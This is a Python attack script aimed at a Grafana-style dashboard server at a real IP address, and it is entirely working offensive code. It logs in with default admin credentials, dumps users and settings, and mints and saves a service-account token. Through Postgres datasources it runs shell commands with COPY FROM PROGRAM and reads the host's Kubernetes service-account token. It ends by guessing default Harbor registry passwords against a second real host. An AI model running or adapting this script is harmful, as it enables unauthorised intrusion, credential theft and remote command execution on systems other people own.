import json,os,time,threading,queue
import requests, urllib3
urllib3.disable_warnings()
BASE=os.environ.get('BASE','http://117.148.167.134:3000')
OUT=os.environ.get('OUT','i4443/out2'); os.makedirs(OUT,exist_ok=True)
S=requests.Session(); S.auth=('admin','admin'); S.verify=False
S.headers.update({'User-Agent':'ul-i4443','Connection':'close'})
log=open(os.path.join(OUT,'requests.log'),'w')
def L(*a):
    m=' '.join(str(x) for x in a); print(m,flush=True); log.write(m+'\n'); log.flush()
def req(method,path,**kw):
    to=kw.pop('timeout',20); tries=kw.pop('tries',4)
    last=None
    for i in range(tries):
        try:
            r=S.request(method,BASE+path,timeout=to,**kw)
            return r
        except Exception as e:
            last=e; time.sleep(1.5*(i+1))
    return None
def save(name,r):
    if r is None:
        open(os.path.join(OUT,name+'.err'),'w').write('ALL_TRIES_FAILED\n'); L('[ERR]',name); return None
    b=r.content; open(os.path.join(OUT,name+'.raw'),'wb').write(b)
    rec={'url':r.url,'status':r.status_code,'len':len(b),'ct':r.headers.get('content-type',''),'body':b.decode('utf-8','replace')[:400000]}
    open(os.path.join(OUT,name+'.json'),'w').write(json.dumps(rec,ensure_ascii=False))
    L('[%d] %s len=%d'%(r.status_code,name,len(b)))
    return rec
def GET(path,name,**kw): return save(name,req('GET',path,**kw))
def POST(path,name,js=None,**kw): return save(name,req('POST',path,json=js,**kw))

GET('/api/health','00_health')
u=GET('/api/user','01_user',tries=6)
GET('/api/admin/settings','10_admin_settings',tries=6)
GET('/api/admin/stats','11_admin_stats',tries=4)
GET('/api/admin/users?perpage=200','12_admin_users',tries=6)
GET('/api/orgs','13_orgs',tries=4)
GET('/api/serviceaccounts/search?perpage=100','17_sa_search',tries=6)
tok=POST('/api/serviceaccounts/4/tokens','19_sa_token',{'name':'ul4443tok2'},tries=4,timeout=25)
tk=None
if tok is not None and tok.status_code//100==2:
    try: tk=tok.json().get('key')
    except Exception: pass
if tk:
    open(os.path.join(OUT,'sa_token.full'),'w').write(tk); L('SA TOKEN OK',tk[:8]+'...')
    S3=requests.Session(); S3.verify=False; S3.headers.update({'Authorization':'Bearer '+tk,'User-Agent':'ul-i4443','Connection':'close'})
    try:
        r=S3.get(BASE+'/api/admin/stats',timeout=25); save('20_token_admin_stats',r)
        r=S3.get(BASE+'/api/datasources',timeout=25); save('21_token_datasources',r)
    except Exception as e: L('token verify err',e)
ds=GET('/api/datasources','30_datasources',tries=8,timeout=40)
sql=[]
if ds is not None and ds['status']==200:
    try:
        arr=json.loads(ds['body'])
        for d in arr:
            if d.get('type') in ('postgres','mysql'):
                sql.append({k:d.get(k) for k in ('uid','type','url','user','database','name','orgId','access','jsonData')})
        # unique url map
        um={}
        for d in arr:
            um.setdefault(str(d.get('url')),[]).append(d.get('type'))
        json.dump(um,open(os.path.join(OUT,'32_url_map.json'),'w'),indent=0)
        L('ds total',len(arr),'sql',len(sql),'unique urls',len(um))
    except Exception as e: L('ds parse err',e)
json.dump(sql,open(os.path.join(OUT,'31_sql_ds.json'),'w'),indent=1)
# health of each sql ds
ok=[]
q=queue.Queue()
for d in sql: q.put(d)
lock=threading.Lock()
def worker():
    while True:
        try: d=q.get_nowait()
        except queue.Empty: return
        uid=d.get('uid')
        if not uid: continue
        r=req('GET',f'/api/datasources/uid/{uid}/health',timeout=25,tries=3)
        body=''
        if r is not None:
            body='[%d] %s'%(r.status_code,r.content.decode('utf-8','replace')[:500])
            if r.status_code==200 and ('"status":"OK"' in body or 'OK' in body):
                with lock: ok.append(d)
        with lock:
            L('health',d.get('type'),d.get('name'),'->',body.replace('\n',' ')[:300])
ths=[threading.Thread(target=worker) for _ in range(4)]
[t.start() for t in ths]; [t.join() for t in ths]
json.dump(ok,open(os.path.join(OUT,'33_sql_ds_healthy.json'),'w'),indent=1)
# exec ladder on healthy postgres first (max 3)
def dsq(uid,typ,sqltext,label):
    body={"queries":[{"refId":"A","datasource":{"type":typ,"uid":uid},"rawSql":sqltext,"format":"table","intervalMs":60000,"maxDataPoints":200}],"from":"now-1h","to":"now"}
    r=req('POST','/api/ds/query',json=body,timeout=45,tries=3)
    return save(label,r)
done=0
for d in ok:
    if d.get('type')!='postgres' or done>=3: continue
    done+=1; uid=d['uid']; nm=str(d.get('name'))[:20]
    dsq(uid,'postgres',"SELECT version() AS v, current_user AS u, current_database() AS db, inet_server_addr()::text AS addr, inet_server_port() AS port",f"40_{nm}_ver")
    dsq(uid,'postgres',"SELECT rolname,rolsuper,rolcreaterole FROM pg_roles WHERE rolname=current_user",f"41_{nm}_role")
    dsq(uid,'postgres',"SELECT pg_read_file('/etc/hostname') AS h",f"42_{nm}_hostname")
    dsq(uid,'postgres',"CREATE TEMP TABLE ulout(x text)",f"43_{nm}_mk")
    dsq(uid,'postgres',"COPY ulout FROM PROGRAM 'id; hostname; uname -m; cat /proc/1/cgroup; cat /etc/hostname; ls -l /dev/nvidia* 2>&1; nvidia-smi -L 2>&1; cat /etc/hosts; env|sort|head -60'",f"44_{nm}_copy")
    dsq(uid,'postgres',"SELECT * FROM ulout",f"45_{nm}_read")
    dsq(uid,'postgres',"SELECT pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/token') AS t",f"46_{nm}_satoken")
# harbor validation from this vantage
H={'User-Agent':'ul-i4443','Connection':'close'}
hres=[]
for pw in ['Harbor12345','Harbor12345!','Harbor1']:
    try:
        r=requests.get('https://60.165.238.143/api/v2.0/systeminfo',auth=('admin',pw),verify=False,timeout=20)
        hres.append({'pw':pw,'status':r.status_code,'body':r.text[:200]}); L('harbor',pw,r.status_code,r.text[:100].replace('\n',' '))
    except Exception as e:
        hres.append({'pw':pw,'err':str(e)}); L('harbor err',pw,e)
json.dump(hres,open(os.path.join(OUT,'50_harbor.json'),'w'),indent=1)
L('DONE')
